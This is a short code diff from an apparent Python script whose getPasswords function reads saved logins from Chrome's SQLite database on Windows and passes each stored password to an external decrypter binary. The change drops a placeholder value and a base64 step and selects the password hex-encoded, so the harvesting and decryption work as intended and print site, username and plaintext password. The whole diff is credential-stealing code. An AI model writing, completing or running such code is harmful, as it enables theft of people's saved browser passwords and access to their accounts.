@@ -43,11 +43,10 @@ def getPasswords(loginFile):
 		if opsys == "Windows":
 			print "Attempting to decrypt Windows Chrome logins"
 
-			query = "SELECT origin_url, username_value, password_value FROM logins"
+			query = "SELECT origin_url, username_value, hex(password_value) FROM logins"
 			
 			for row in conn.execute(query):
-				pwd = base64.b64encode(row[2])
-				pwd = "ciao"
+				pwd = row[2]
 				retval = subprocess.check_output([WIN_DECRYPTER, pwd])
 				print retval
 
